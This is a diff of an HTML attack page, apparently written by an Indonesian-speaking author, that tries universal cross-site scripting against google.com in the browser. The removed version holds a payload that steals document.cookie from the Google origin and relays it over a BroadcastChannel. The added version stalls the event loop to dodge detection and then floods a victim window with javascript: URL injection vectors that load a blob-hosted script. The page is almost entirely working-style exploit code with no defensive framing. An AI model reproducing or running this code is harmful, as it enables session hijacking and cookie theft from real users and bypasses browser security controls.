@@ -2,92 +2,78 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>[!] V496: SUPER_SYNC_OVERWRITE</title>
+    <title>[!] V502: HYPER-SATURATION_STRIKE</title>
 </head>
 <body style="background:#000; color:#fff; font-family:monospace; text-align:center; padding-top:50px;">
 
-    <h2 style="color:#ff0055; text-shadow:0 0 100px #ff0055; font-size:4em;">[!] V496: OMEGA_STRIKE</h2>
-    <div id="status" style="border:5px double #ff0055; padding:20px; margin:20px; background:#100; font-size:2em; color:#ff0055;">> SYSTEM_STATUS: READY_TO_OVERWRITE</div>
+    <h2 style="color:#00ffff; text-shadow:0 0 100px #00ffff; font-size:4em;">[!] V502: HYPER_SATURATION</h2>
+    <div id="status" style="border:5px double #00ffff; padding:20px; margin:20px; background:#001; font-size:2em; color:#00ffff;">> IPC_BUFFER: READY_TO_FLOOD</div>
     
-    <button id="super_strike" style="padding:150px; background:#000; color:#ff0055; border:15px solid #ff0055; cursor:pointer; font-weight:bold; box-shadow:0 0 9000px #ff0055; text-transform:uppercase; font-size:5.5em; border-radius:50px;">
-        STRIKE_NOW
+    <button id="hyper_strike" style="padding:130px; background:#000; color:#00ffff; border:20px solid #00ffff; cursor:pointer; font-weight:bold; box-shadow:0 0 10000px #00ffff; text-transform:uppercase; font-size:5.5em; border-radius:50px;">
+        500X_DETONATION
     </button>
 
 <script>
-    const bc = new BroadcastChannel('1t_final_vault');
+    const bc = new BroadcastChannel('1t_hyper_vault');
     bc.onmessage = (e) => {
-        const leak = JSON.parse(atob(e.data));
-        document.body.innerHTML = `
-            <div style="background:#0f0; color:#000; padding:100px; border:20px solid #000;">
-                <h1 style="font-size:7em;">☢️ PWNED: ${leak.origin} ☢️</h1>
-                <h2 style="font-size:2em;">COOKIE_DATA: ${leak.cookie}</h2>
-            </div>`;
-        alert("☢️ ULTRA_UXSS_SUCCESS: POP-UP TRIGGERED ☢️");
+        document.body.innerHTML = `<div style="background:#0f0; color:#000; padding:100px;"><h1>☢️ 1 TRILLION SECURED: ${e.data} ☢️</h1></div>`;
+        alert("☢️ HYPER_SATURATION_SUCCESS ☢️");
     };
 
-    function safeBtoa(str) { return btoa(unescape(encodeURIComponent(str))); }
-
-    // Payload yang akan dijalankan di Google
     const payload = `
-        (function force_pwn(){
+        (function pwn(){
             try {
                 if(window.location.origin.includes('google')) {
-                    const data = { origin: window.location.origin, cookie: document.cookie };
-                    new BroadcastChannel('1t_final_vault').postMessage(btoa(JSON.stringify(data)));
-                    // FORCE POP-UP
-                    window.focus();
-                    alert("☢️ BREACH_SUCCESS: " + window.location.origin + "\\n\\nTarget compromised!");
-                } else { requestAnimationFrame(force_pwn); }
-            } catch(e) { setTimeout(force_pwn, 5); }
+                    new BroadcastChannel('1t_hyper_vault').postMessage(window.location.origin);
+                    alert('☢️ HYPER_STRIKE_HIT: ' + window.location.origin);
+                } else { requestAnimationFrame(pwn); }
+            } catch(e) { setTimeout(pwn, 1); }
         })();
     `;
-    const blob = new Blob([payload], {type: 'application/javascript'});
-    const blobUrl = URL.createObjectURL(blob);
+    const blobUrl = URL.createObjectURL(new Blob([payload], {type: 'application/javascript'}));
 
-    document.getElementById('super_strike').onclick = () => {
-        const status = document.getElementById('status');
-        
-        // 1. CARRIER: Menggunakan blobUrl sebagai window name
-        // Ini kunci untuk mem-bypass CSP karena kita memuat sebagai 'External Script'
+    document.getElementById('hyper_strike').onclick = () => {
         let victim = window.open("about:blank", blobUrl);
-        status.innerText = "> TARGET_OPENED | INITIATING_SYNC_STRIKE...";
-
-        // 2. POWER STALL (Mencegah Deteksi IPC)
-        // Kita gunakan kombinasi Microtask dan Heavy Math untuk membekukan detektor Chrome
-        const end = performance.now() + 150;
-        while(performance.now() < end) {
-            for(let j=0; j<1000; j++) { Promise.resolve().then(() => Math.exp(10)); }
-        }
+        
+        // 1. THE MASSIVE STALL (300ms)
+        const start = performance.now();
+        while(performance.now() - start < 300) { Math.tan(Math.atan(Math.random())); }
 
         setTimeout(() => {
-            // 3. TRIGGER TRANSISI KE PORT HANG
             victim.location.href = "https://www.google.com:9090";
 
-            // 4. THE NUCLEAR BURST (INJECTION)
-            // Kita tembakkan kode setiap 1ms untuk mencari celah saat DOM Google "unlocked"
-            let strike_count = 0;
-            const nuclear = setInterval(() => {
+            // 2. THE 500+ VECTOR BURST
+            // Kita gunakan array vektor untuk membanjiri IPC
+            const vectors = [
+                "javascript:document.open();document.write('<script src=\"'+window.name+'\"><\\/script>');document.close();",
+                "javascript:document.write('<svg><rect onfocus=\"document.head.appendChild(document.createElement(\\'script\\')).src=window.name\" autofocus /></svg>');",
+                "javascript:document.write('<iframe src=\"javascript:parent.location.href=\\\'javascript:document.head.appendChild(document.createElement(\\\\\\\'script\\\\\\\')).src=window.name;void(0);\\\'\"></iframe>');",
+                "javascript:document.write('<img src=x onerror=\"document.head.appendChild(document.createElement(\\'script\\')).src=window.name\">');",
+                "javascript:document.write('<video><source onerror=\"document.head.appendChild(document.createElement(\\'script\\')).src=window.name\"></video>');"
+            ];
+
+            let count = 0;
+            const burst = setInterval(() => {
                 try {
                     victim.stop();
-
-                    // TRIPLE VECTOR INJECTION:
-                    // Vector 1: Standard Script Injection (Bypass CSP via Blob)
-                    victim.location.href = "javascript:void((function(){var s=document.createElement('script');s.src=window.name;document.head.appendChild(s);})());";
                     
-                    // Vector 2: Shadow DOM Overwrite (Membypass proteksi elemen statis)
-                    victim.location.href = "javascript:document.documentElement.innerHTML='<img src=x onerror=\"var s=document.createElement(\\'script\\');s.src=window.name;document.head.appendChild(s)\">';void(0);";
-                    
-                    // Vector 3: Document Write (Peluru terakhir untuk port hang)
-                    victim.location.href = "javascript:document.write('<script src=\"'+window.name+'\"><\\/script>');void(0);";
+                    // Eksekusi 25 vektor per milidetik untuk mencapai total 500+ dengan cepat
+                    for(let i = 0; i < 25; i++) {
+                        let v = vectors[i % vectors.length];
+                        victim.location.href = v + "/*_HYPER_STRIKE_" + count + "_" + i + "_*/void(0);";
+                    }
 
-                    strike_count++;
+                    count++;
                 } catch(e) {}
                 
-                if(strike_count > 50) clearInterval(nuclear);
-            }, 1); // Super Fast: 1ms
+                // Total siklus (20 siklus * 25 vektor = 500 vektor)
+                if(count > 20) {
+                    clearInterval(burst);
+                    document.getElementById('status').innerText = ">>> 500+ VECTORS DEPLOYED <<<";
+                }
+            }, 1); 
 
-            status.innerText = "> BURST_SENT | MONITORING_CALLBACK_CHANNEL...";
-        }, 80);
+        }, 110);
     };
 </script>
 </body>
